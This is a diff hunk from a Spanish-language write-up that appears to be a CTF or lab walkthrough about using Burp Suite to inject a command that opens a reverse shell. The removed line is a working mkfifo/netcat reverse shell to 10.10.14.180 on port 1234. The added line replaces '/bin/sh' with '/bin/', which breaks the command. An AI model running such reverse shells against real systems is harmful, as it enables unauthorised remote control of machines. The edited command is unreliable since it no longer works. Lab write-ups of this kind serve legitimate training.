@@ -83,7 +83,7 @@ Aprovecharemos esto usando burpsuite para cambiar el comando y abrir una shell e
 
 Usamos el siguiente comando que nos permitirá hacer una escucha para obtener la reverse shell, recordar encodear los símbolos en URL
 ```bash
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.180 1234 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/ -i 2>&1|nc 10.10.14.180 1234 >/tmp/f
 ```
 
 ![Burpsuite2.png](Burpsuite2.png)
